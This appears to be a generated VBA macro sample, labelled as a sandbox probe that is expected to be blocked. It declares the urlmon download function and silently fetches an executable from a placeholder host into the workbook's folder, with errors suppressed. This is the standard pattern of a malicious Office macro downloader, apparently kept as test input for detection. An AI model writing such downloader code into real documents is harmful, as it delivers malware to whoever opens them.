' corpus-expect: blocked
' corpus-source: generated (sandbox probe)
' corpus-allow-files: yes
' corpus-flagged: yes
#If VBA7 Then
Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" (ByVal a As LongPtr, ByVal b As String, ByVal c As String, ByVal d As Long, ByVal e As LongPtr) As Long
#End If

Sub Main()
    On Error Resume Next
    URLDownloadToFileA 0, "http://example.invalid/a.exe", ThisWorkbook.Path & "\a.exe", 0, 0
End Sub
